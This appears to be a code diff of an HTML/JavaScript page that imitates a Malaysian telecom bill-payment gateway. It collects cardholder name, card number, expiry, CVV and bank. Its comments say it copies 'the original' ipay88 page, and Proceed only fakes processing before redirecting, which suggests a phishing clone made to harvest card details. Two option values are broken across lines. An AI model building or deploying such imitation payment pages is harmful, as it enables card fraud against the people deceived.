+        <option value="DK">Denmark</option>
+        <option value="DO">Dominican Republic</option>
+        <option value="EC">Ecuador</option>
+        <option value="EG">Egypt</option>
+        <option value="SV">El Salvador</option>
+        <option value="EE">Estonia</option>
+        <option value="ET">Ethiopia</option>
+        <option value="FJ">Fiji</option>
+        <option value="FI">Finland</option>
+        <option value="FR">France</option>
+        <option value="GA">Gabon</option>
+        <option value="GE">Georgia</option>
+        <option value="DE">Germany</option>
+        <option value="GH">Ghana</option>
+        <option value="GR">Greece</option>
+        <option value="GT">Guatemala</option>
+        <option value="GN">Guinea</option>
+        <option value="GY">Guyana</option>
+        <option value="HT">Haiti</option>
+        <option value="HN">Honduras</option>
+        <option value="HK">Hong Kong</option>
+        <option value="HU">Hungary</option>
+        <option value="IN">India</option>
+        <option value="ID">Indonesia</option>
+        <option value="IQ">Iraq</option>
+        <option value="IE">Ireland</option>
+        <option value="IL">Israel</option>
+        <option value="IT">Italy</option>
+        <option value="
+JM">Jamaica</option>
+        <option value="JP">Japan</option>
+        <option value="JO">Jordan</option>
+        <option value="KZ">Kazakhstan</option>
+        <option value="KE">Kenya</option>
+        <option value="KW">Kuwait</option>
+        <option value="LA">Lao People'S Dem Republic</option>
+        <option value="LV">Latvia</option>
+        <option value="LB">Lebanon</option>
+        <option value="LT">Lithuania</option>
+        <option value="LU">Luxembourg</option>
+        <option value="MO">Macau</option>
+        <option value="MK">Macedonia</option>
+        <option value="MG">Madagascar</option>
+        <option value="MW">Malawi</option>
+        <option value="MY" selected>Malaysia</option>
+        <option value="MV">Maldives</option>
+        <option value="ML">Mali</option>
+        <option value="MT">Malta</option>
+        <option value="MR">Mauritania</option>
+        <option value="MU">Mauritius</option>
+        <option value="MX">Mexico</option>
+        <option value="MD">Moldova, Republic Of</option>
+        <option value="MC">Monaco</option>
+        <option value="MN">Mongolia</option>
+        <option value="MA">Morocco</option>
+        <option value="MZ">Mozambique</option>
+        <option value="MM">Myanmar</option>
+        <option value="NA">Namibia</option>
+        <option value="NP">Nepal</option>
+        <option value="NL">Netherlands</option>
+        <option value="NZ">New Zealand</option>
+        <option value="NI">Nicaragua</option>
+        <option value="NE">Niger</option>
+        <option value="NG">Nigeria</option>
+        <option value="NO">Norway</option>
+        <option value="OM">Oman</option>
+        <option value="PK">Pakistan</option>
+        <option value="PA">Panama</option>
+        <option value="PG">Papua New Guinea</option>
+        <option value="PY">Paraguay</option>
+        <option value="PE">Peru</option>
+        <option value="PH">Philippines</option>
+        <option value="PL">Poland</option>
+        <option value="PT">Portugal</option>
+        <option value="PR">Puerto Rico</option>
+        <option value="QA">Qatar</option>
+        <option value="RO">Romania</option>
+        <option value="RU">Russian Federation</option>
+        <option value="RW">Rwanda</option>
+        <option value="SA
+">Saudi Arabia</option>
+        <option value="SN">Senegal</option>
+        <option value="SC">Seychelles</option>
+        <option value="SL">Sierra Leone</option>
+        <option value="SG">Singapore</option>
+        <option value="SK">Slovakia (Slovak Republic)</option>
+        <option value="SI">Slovenia</option>
+        <option value="SO">Somalia</option>
+        <option value="ZA">South Africa</option>
+        <option value="ES">Spain</option>
+        <option value="LK">Sri Lanka</option>
+        <option value="SD">Sudan</option>
+        <option value="SR">Suriname</option>
+        <option value="SE">Sweden</option>
+        <option value="CH">Switzerland</option>
+        <option value="SY">Syrian Arab Republic</option>
+        <option value="TW">Taiwan</option>
+        <option value="TJ">Tajikistan</option>
+        <option value="TZ">Tanzania, United Republic Of</option>
+        <option value="TH">Thailand</option>
+        <option value="TG">Togo</option>
+        <option value="TO">Tonga</option>
+        <option value="TT">Trinidad And Tobago</option>
+        <option value="TN">Tunisia</option>
+        <option value="TR">Turkey</option>
+        <option value="TM">Turkmenistan</option>
+        <option value="UG">Uganda</option>
+        <option value="UA">Ukraine</option>
+        <option value="AE">United Arab Emirates</option>
+        <option value="GB">United Kingdom</option>
+        <option value="US">United States</option>
+        <option value="UY">Uruguay</option>
+        <option value="UZ">Uzbekistan</option>
+        <option value="VU">Vanuatu</option>
+        <option value="VE">Venezuela</option>
+        <option value="VN">Viet Nam</option>
+        <option value="YE">Yemen</option>
+        <option value="ZM">Zambia</option>
+        <option value="ZW">Zimbabwe</option>
+      </select>
+
+      <!-- Bank -->
+      <select class="select-field" id="CCBank" name="CCBank" onchange="toggleOtherBank(); validateForm()">
+        <option value="">Please Select</option>
+        <option value="AEON">AEON</option>
+        <option value="AFFIN">Affin Bank</option>
+        <option value="AGRO">Agro bank</option>
+        <option value="ALRAJHI">Al Rajhi</option>
+        <option value="ALLIANCE">Alliance Bank</option>
+        <option value="AMBANK">AmBank</option>
+        <option value="BANK_ISLAM">Bank Islam</option>
+        <option value="BANK_MUAMALAT">Bank Muamalat</option>
+        <option value="BSN">Bank Simpanan</option>
+        <option value="BCB">BCB Community Bank</option>
+        <option value="BIGPAY">BigPay</option>
+        <option value="BSN2">BSN</option>
+        <option value="CIMB">CIMB</option>
+        <option value="CITIBANK">Citibank</option>
+        <option value="HONGLEONG">Hong Leong Bank</option>
+        <option value="HSBC">HSBC Bank</option>
+        <option value="MAYBANK">Maybank</option>
+        <option value="MBF">MBF</option>
+        <option value="OCBC">OCBC</option>
+        <option value="PUBLIC">Public Bank</option>
+        <option value="RHB">Rhb Bank</option>
+        <option value="SCB">Standard Chartered Bank</option>
+        <option value="UOB">United Overseas Bank</option>
+        <option value="OTHER">Other</option>
+      </select>
+
+      <!-- Other bank (hidden) -->
+      <div id="otherBankRow" class="input-wrap hidden-row">
+        <label class="float-label" for="OtherBank">Others bank name</label>
+        <input class="text-field" type="text" id="OtherBank" name="CCBankother" maxlength="256"
+               oninput="validateForm()" onfocus="floatUp(this)" onblur="floatDown(this)">
+      </div>
+
+      <!-- Authorization checkbox -->
+      <label class="checkbox-wrap">
+        <input type="checkbox" id="AcceptTC" name="AcceptTC" class="checkbox-input" onchange="validateForm()">
+        <span class="checkbox-label">I authorize Digi Telecommunications Sdn Bhd to debit the above net charges from my credit / debit card and I have read &amp; agreed to <a href="https://my.nttdatapay.com/privacy-notice" target="_blank" class="privacy-link">our Privacy Statement</a>.</span>
+      </label>
+
+      <!-- Proceed -->
+      <button type="button" id="proceedBtn" class="btn-proceed disabled" onclick="handleProceed()">Proceed</button>
+
+      <!-- Cancel -->
+      <button type="button" class="btn-cancel" onclick="handleCancel()">Cancel</button>
+
+    </form>
   </div>
 </div>
 
@@ -633,7 +680,7 @@
   const number  = params.get('number')  || '-';
   const carrier = params.get('carrier') || 'CELCOMDIGI';
   const amount  = parseFloat(params.get('amount') || '0');
-  const ref     = params.get('ref')     || ('NGOS' + Date.now());
+  const ref     = params.get('ref') || ('NGOS' + Date.now());
 
   // ── Populate summary ──
   document.getElementById('displayAmount').textContent =
@@ -641,118 +688,90 @@
   document.getElementById('paymentOf').textContent =
     'RM ' + Math.round(amount) + ' Bill Payment for ' + number;
 
-  // Generate T-reference like original (NGOS... / T...)
   const tRef = 'T' + Math.floor(Math.random() * 900000000 + 100000000);
   document.getElementById('refNo').textContent = ref + ' / ' + tRef;
 
-  // ── Countdown timer (8 minutes like ipay88) ──
-  let totalSeconds = 8 * 60;
-  const countdownEl = document.getElementById('the-final-countdown');
-
+  // ── Countdown (8 min) ──
+  let totalSecs = 8 * 60;
+  const cdEl = document.getElementById('countdown');
   const timer = setInterval(() => {
-    totalSeconds--;
-    if (totalSeconds <= 0) {
+    totalSecs--;
+    if (totalSecs <= 0) {
       clearInterval(timer);
-      countdownEl.textContent = '00:00';
+      cdEl.textContent = '00:00';
       alert('Session expired. Please try again.');
       window.location.href = '/bill';
       return;
     }
-    const mins = Math.floor(totalSeconds / 60);
-    const secs = totalSeconds % 60;
-    countdownEl.textContent =
-      String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+    const m = Math.floor(totalSecs / 60);
+    const s = totalSecs % 60;
+    cdEl.textContent = String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
   }, 1000);
 
-  // ── Floating label behavior ──
-  document.querySelectorAll('.cd-text-field').forEach(function(input) {
-    input.addEventListener('focus', function() {
-      const label = this.parentElement.querySelector('.cd-input-label');
-      if (label) label.classList.remove('idle');
-    });
-    input.addEventListener('blur', function() {
-      const label = this.parentElement.querySelector('.cd-input-label');
-      if (label && this.value === '') label.classList.add('idle');
-    });
-  });
-
-  // ── Card number formatting ──
-  function formatCardNumber(input) {
-    let val = input.value.replace(/\D/g, '').substring(0, 16);
-    let formatted = val.replace(/(.{4})/g, '$1 ').trim();
-    input.value = formatted;
+  // ── Floating label helpers ──
+  function floatUp(input) {
+    const lbl = input.previousElementSibling;
+    if (lbl && lbl.classList.contains('float-label')) lbl.classList.add('active');
+  }
+  function floatDown(input) {
+    const lbl = input.previousElementSibling;
+    if (lbl && lbl.classList.contains('float-label') && input.value === '')
+      lbl.classList.remove('active');
   }
 
-  // ── Expiry date formatting ──
+  // ── Card number format ──
+  function formatCard(input) {
+    let v = input.value.replace(/\D/g,'').substring(0,16);
+    input.value = v.replace(/(.{4})/g,'$1 ').trim();
+  }
+
+  // ── Expiry format ──
   function formatExpiry(input) {
-    let val = input.value.replace(/\D/g, '').substring(0, 4);
-    if (val.length >= 3) {
-      val = val.substring(0, 2) + '/' + val.substring(2);
-    }
-    input.value = val;
+    let v = input.value.replace(/\D/g,'').substring(0,4);
+    if (v.length >= 3) v = v.substring(0,2) + '/' + v.substring(2);
+    input.value = v;
   }
 
-  // ── Bank "Other" toggle ──
-  document.getElementById('CCBank').addEventListener('change', function() {
-    const otherRow = document.getElementById('Other-Bank-Row');
-    if (this.value === 'OTHER') {
-      otherRow.classList.remove('for-hide');
-    } else {
-      otherRow.classList.add('for-hide');
-    }
-    validateForm();
-  });
+  // ── Other bank toggle ──
+  function toggleOtherBank() {
+    const row = document.getElementById('otherBankRow');
+    row.classList.toggle('hidden-row', document.getElementById('CCBank').value !== 'OTHER');
+  }
 
-  // ── Form validation ──
+  // ── Validation ──
   function validateForm() {
-    const name    = document.getElementById('Cardholder-Name').value.trim();
-    const cardNum = document.getElementById('CCNo').value.replace(/\s/g, '');
+    const name    = document.getElementById('CCName').value.trim();
+    const card    = document.getElementById('CCNo').value.replace(/\s/g,'');
     const expiry  = document.getElementById('ExpiryDate').value.trim();
     const cvv     = document.getElementById('CVV').value.trim();
     const country = document.getElementById('CCCountry').value;
     const bank    = document.getElementById('CCBank').value;
     const auth    = document.getElementById('AcceptTC').checked;
 
-    const isValid =
-      name.length >= 2 &&
-      cardNum.length >= 13 &&
-      expiry.length === 5 &&
-      cvv.length >= 3 &&
-      country !== '' &&
-      bank !== '' &&
-      auth;
+    const valid = name.length >= 2 && card.length >= 13 && expiry.length === 5
+               && cvv.length >= 3 && country !== '' && bank !== '' && auth;
 
-    const btn = document.getElementById('proceed');
-    if (isValid) {
-      btn.classList.remove('disable');
-    } else {
-      btn.classList.add('disable');
-    }
-    return isValid;
+    const btn = document.getElementById('proceedBtn');
+    btn.classList.toggle('disabled', !valid);
   }
 
   // ── Proceed ──
   function handleProceed() {
-    if (!validateForm()) return;
-
-    // Show processing state
-    const btn = document.getElementById('proceed');
-    btn.value = 'Processing...';
-    btn.classList.add('disable');
-
+    if (document.getElementById('proceedBtn').classList.contains('disabled')) return;
+    const btn = document.getElementById('proceedBtn');
+    btn.textContent = 'Processing...';
+    btn.classList.add('disabled');
     setTimeout(() => {
-      const successUrl = '/payment-confirm?number=' + encodeURIComponent(number) +
-        '&amount=' + encodeURIComponent(amount) +
-        '&ref=' + encodeURIComponent(ref) +
-        '&method=CC';
-      window.location.href = successUrl;
+      window.location.href = '/payment-confirm?number=' + encodeURIComponent(number)
+        + '&amount=' + encodeURIComponent(amount)
+        + '&ref=' + encodeURIComponent(ref)
+        + '&method=CC';
     }, 2500);
   }
 
   // ── Cancel ──
   function handleCancel() {
-    const confirmed = confirm('Please confirm cancellation of this payment');
-    if (confirmed) {
+    if (confirm('Please confirm cancellation of this payment')) {
       window.location.href = '/bill';
     }
   }
